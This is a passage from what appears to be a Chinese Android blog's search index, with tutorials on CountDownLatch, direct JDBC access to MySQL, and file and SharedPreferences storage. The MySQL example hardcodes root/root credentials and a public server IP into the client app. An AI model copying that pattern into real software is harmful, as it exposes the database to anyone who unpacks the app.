&#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span> * <span class="number">3</span>);</span><br><span class="line">                latch.countDown();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ry &#123;</span><br><span class="line">    latch.await();<span class="comment">// 等待所有线程完成操作</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放在主线程可以使全部countdown( )执行完才执行主线程</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-直连数据库</title>
      <link href="/2020/10/04/Android/Android-%E7%9B%B4%E8%BF%9E%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2020/10/04/Android/Android-%E7%9B%B4%E8%BF%9E%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="导入包"><a href="#导入包" class="headerlink" title="导入包"></a>导入包</h1><p>实现直连MySql数据库需要导入<a href="https://pan.baidu.com/s/1XOMgeOBXyDIZLjEl50k6rA">mysql-connector-java-5.1.30-bin</a>jar包（百度网盘提取码为：ctxa）</p><h2 id="主窗口代码"><a href="#主窗口代码" class="headerlink" title="主窗口代码"></a>主窗口代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.mysql;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.annotation.SuppressLint;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"><span class="keyword">import</span> android.os.Message;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Button btn_get_data;</span><br><span class="line">    <span class="keyword">private</span> TextView tv_data;</span><br><span class="line">    <span class="meta">@SuppressLint(&quot;HandlerLeak&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Handler handler = <span class="keyword">new</span> Handler()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (msg.what)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">                    String s = (String) msg.obj;</span><br><span class="line">                    tv_data.setText(s);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x12</span>:</span><br><span class="line">                    String ss = (String) msg.obj;</span><br><span class="line">                    tv_data.setText(ss);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        btn_get_data=(Button) findViewById(R.id.button1);</span><br><span class="line">        tv_data=(TextView) findViewById(R.id.text1);</span><br><span class="line"></span><br><span class="line">        btn_get_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 创建一个线程来连接数据库并获取数据库中对应表的数据</span></span><br><span class="line">                <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        <span class="comment">// 调用数据库工具类DBUtils的getInfoByName方法获取数据库表中数据</span></span><br><span class="line">                        HashMap&lt;String, Object&gt; map = DBUtils.getInfoByName(<span class="string">&quot;29282&quot;</span>);</span><br><span class="line">                        Message message = handler.obtainMessage();</span><br><span class="line">                        <span class="keyword">if</span>(map != <span class="keyword">null</span>)&#123;</span><br><span class="line">                            String s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            <span class="keyword">for</span> (String key : map.keySet())&#123;</span><br><span class="line">                                s += key + <span class="string">&quot;:&quot;</span> + map.get(key) + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            message.what = <span class="number">0x12</span>;</span><br><span class="line">                            message.obj = s;</span><br><span class="line">                        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                            message.what = <span class="number">0x11</span>;</span><br><span class="line">                            message.obj = <span class="string">&quot;查询结果为空&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 发消息通知主线程更新UI</span></span><br><span class="line">                        handler.sendMessage(message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是用HashMap去对应键值之间的关系</p><h2 id="DBUtils类代码"><a href="#DBUtils类代码" class="headerlink" title="DBUtils类代码"></a>DBUtils类代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.mysql;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.TooManyListenersException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数据库工具类：连接数据库用、获取数据库数据用</span></span><br><span class="line"><span class="comment"> * 相关操作数据库的方法均可写在该类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DBUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String driver = <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;<span class="comment">// MySql驱动</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    private static String url = &quot;jdbc:mysql://localhost:3306/map_designer_test_db&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String user = <span class="string">&quot;root&quot;</span>;<span class="comment">// 用户名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String password = <span class="string">&quot;root&quot;</span>;<span class="comment">// 密码</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Connection <span class="title">getConn</span><span class="params">(String dbName)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Connection connection = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Class.forName(driver);<span class="comment">// 动态加载类</span></span><br><span class="line">            String ip = <span class="string">&quot;47.96.151.142&quot;</span>;<span class="comment">// 写成本机地址，不能写成localhost，同时手机和电脑连接的网络必须是同一个</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 尝试建立到给定数据库URL的连接</span></span><br><span class="line">            connection = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://&quot;</span> + ip + <span class="string">&quot;:3306/&quot;</span> + dbName,</span><br><span class="line">                    user, password);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> connection;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;String, Object&gt; <span class="title">getInfoByName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">// 根据数据库名称，建立连接</span></span><br><span class="line">        Connection connection = getConn(<span class="string">&quot;mydb1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// mysql简单的查询语句。这里是根据MD_CHARGER表的NAME字段来查询某条记录</span></span><br><span class="line">            String sql = <span class="string">&quot;select * from hearts where id = 4869&quot;</span>;</span><br><span class="line"><span class="comment">//            String sql = &quot;select * from MD_CHARGER&quot;;</span></span><br><span class="line">            <span class="keyword">if</span> (connection != <span class="keyword">null</span>)&#123;<span class="comment">// connection不为null表示与数据库建立了连接</span></span><br><span class="line">                PreparedStatement ps = connection.prepareStatement(sql);</span><br><span class="line">                <span class="keyword">if</span> (ps != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="comment">// 设置上面的sql语句中的？的值为name</span></span><br><span class="line"><span class="comment">//                    ps.setString(1, name);</span></span><br><span class="line">                    <span class="comment">// 执行sql查询语句并返回结果集</span></span><br><span class="line">                    ResultSet rs = ps.executeQuery();</span><br><span class="line">                    <span class="keyword">if</span> (rs != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">int</span> count = rs.getMetaData().getColumnCount();</span><br><span class="line">                        Log.e(<span class="string">&quot;DBUtils&quot;</span>,<span class="string">&quot;列总数：&quot;</span> + count);</span><br><span class="line">                        <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">                            <span class="comment">// 注意：下标是从1开始的</span></span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= count;i++)&#123;</span><br><span class="line">                                String field = rs.getMetaData().getColumnName(i);</span><br><span class="line">                                <span class="comment">//id名 值</span></span><br><span class="line">                                map.put(field, rs.getString(field));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        connection.close();</span><br><span class="line">                        ps.close();</span><br><span class="line">                        <span class="keyword">return</span>  map;</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span>  <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span>  <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            Log.e(<span class="string">&quot;DBUtils&quot;</span>,<span class="string">&quot;异常：&quot;</span> + e.getMessage());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-数据存储</title>
      <link href="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/"/>
      <url>/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Android数据持久化"><a href="#Android数据持久化" class="headerlink" title="Android数据持久化"></a>Android数据持久化</h1><p>Android主要提供了三种方式数据持久：文件存储、SharePreference或数据库来保存数据</p><h2 id="文件存储"><a href="#文件存储" class="headerlink" title="文件存储"></a>文件存储</h2><p>Context类中提供了一个openFileOutput( )方法，可以将数据存到指定文件，该方法有两个参数</p><p>第一个参数是文件名，在文件创建的时候使用的就是这个名词，这里指定的文件名不包含路径，因为所有的文件都是默认存到/data/data/&lt;packagename&gt;/files目录下，第二个参数文件的操作模式，主要有两种模式可选MODE_PRIVATE和MODE_APPEND</p><p>MODE_PRIVATE是默认操作模式，表示指定同样文件名，所写入的内容将会覆盖源文件的内容</p><p>MODE_APPEND则表示如果文件已经存在，就往里面追加内容，不存在就创建新文件</p><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200926153408496.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200926153408496.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200926153408496"><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200926153418294.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200926153418294.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200926153418294"></p><p>通过点击按钮去保存主窗口的editText的内容，然后主activity的内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    EditText editText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">         editText=(EditText) findViewById(R.id.edit_text);</span><br><span class="line">        Button button=(Button) findViewById(R.id.button1);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                String data=editText.getText().toString();</span><br><span class="line">                Save(data);</span><br><span class="line">                Intent intent=<span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>,msgActivity.class);</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Save</span><span class="params">(String data)</span></span>&#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">null</span>;</span><br><span class="line">        BufferedWriter writer =<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//打开文件输出流</span></span><br><span class="line">            out=openFileOutput(<span class="string">&quot;data&quot;</span>, Context.MODE_PRIVATE);</span><br><span class="line">            <span class="comment">//缓存写入流拿到文件输出流</span></span><br><span class="line">            writer=<span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> OutputStreamWriter(out));</span><br><span class="line">            writer.write(data);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(writer!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该窗口最重要的是Save内容，其中先开输出文件流，用缓存写入流去拿到这个文件输出流，然后将数据写入到输出流中</p><p>下面是消息活动，主要内容是读文件的内容，操作与写入类似，使用的是文件输入流，以及缓存读取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">msgActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_msg);</span><br><span class="line">        TextView textView=(TextView) findViewById(R.id.text_view);</span><br><span class="line">        String data=tostringread();</span><br><span class="line">        textView.setText(data);</span><br><span class="line">        Toast.makeText(msgActivity.<span class="keyword">this</span>,data,Toast.LENGTH_SHORT).show();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">tostringread</span><span class="params">()</span></span>&#123;</span><br><span class="line">       FileInputStream in=<span class="keyword">null</span>;</span><br><span class="line">       BufferedReader reader=<span class="keyword">null</span>;</span><br><span class="line">       StringBuilder last=<span class="keyword">new</span> StringBuilder();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">//打开文件输入 获取文件输入流</span></span><br><span class="line">           in=openFileInput(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">           <span class="comment">//通过缓存读取去获得文件输入流</span></span><br><span class="line">           reader=<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">           <span class="comment">//处理一个输入流 </span></span><br><span class="line">           String line=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line=reader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                last.append(line);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span>(reader!=<span class="keyword">null</span>)&#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   reader.close();</span><br><span class="line">               &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> last.toString();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先打开一个文件输入流，缓存读取去活动文件输入流，然后处理缓存的内容</p><p>此项的StringBuilder跟String类似，不过StringBuilder可以直接对内存空间进行一个持续的添加与修改，最后再转化为String，这样效率会相同较高</p><h2 id="SharePreferences存储"><a href="#SharePreferences存储" class="headerlink" title="SharePreferences存储"></a>SharePreferences存储</h2><p>不同文件的存储方式，sharepreferences是使用 <code>键值对</code> 的方式来存储数据的，意思就是当保存一条数据的时候，需要给这条数据提供一个对应的键，这样读取数据的时候就可以通过这个键把相应的值取出来，而SharePrefences还支持多种不同的数据类型存储，如果存储的数据类型是整型，那么读出来的数据也是整形，如果存储的数据是一个字符串，那么读取出来的数据仍是字符串</p><h4 id="a、Context类中的getSharePreferens-方法"><a href="#a、Context类中的getSharePreferens-方法" class="headerlink" title="a、Context类中的getSharePreferens( )方法"></a>a、Context类中的getSharePreferens( )方法</h4><p>该方法两个参数，第一个参数用于指定SharedPreferences文件的名称，如果指定的文件不存在则会创建一个，SharedPreferens文件都是存放在/data/data/&lt;package name&gt;/shared_prefs/目录下；第二个参数是用于指定一操作模式，只有MODE_PRIVATE一种模式可以选</p><h4 id="b、Activity类中的getPreferences-方法"><a href="#b、Activity类中的getPreferences-方法" class="headerlink" title="b、Activity类中的getPreferences( )方法"></a>b、Activity类中的getPreferences( )方法</h4><p>与上面很相似，不过这个方法只接收一个操作模式的参数，使用这个方法会自动将当前活动的类名作为SharedPreferences的文件名</p><h4 id="c、PreferenceManger类中的getDefalutSharePreferences-方法"><a href="#c、PreferenceManger类中的getDefalutSharePreferences-方法" class="headerlink" title="c、PreferenceManger类中的getDefalutSharePreferences( )方法"></a>c、PreferenceManger类中的getDefalutSharePreferences( )方法</h4><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200926160850196.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200926160850196.png" 